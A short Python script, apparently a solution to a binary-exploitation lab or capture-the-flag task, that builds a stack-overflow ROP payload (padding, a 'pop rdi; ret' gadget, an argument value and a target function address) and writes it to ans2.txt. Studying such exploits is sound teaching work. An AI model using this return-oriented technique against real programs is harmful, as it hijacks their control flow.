import struct

padding_len = 16       # 缓冲区(8) + 保存的RBP(8)
pop_rdi_ret = 0x4012c7    # gadget 地址
arg_value   = 0x3f8     
func2_addr  = 0x401216   # 目标函数地址

# 逻辑：
# 填充垃圾数据直到覆盖返回地址，返回地址被覆盖为 'pop rdi; ret' 的地址 -->执行 pop rdi
# 栈上下一个值是 0x3f8 --> pop rdi 把 0x3f8 弹入 RDI 寄存器

payload = b'A' * padding_len
payload += struct.pack('<Q', pop_rdi_ret)
payload += struct.pack('<Q', arg_value)
payload += struct.pack('<Q', func2_addr)

with open("ans2.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated: ans2.txt (Length: {len(payload)})")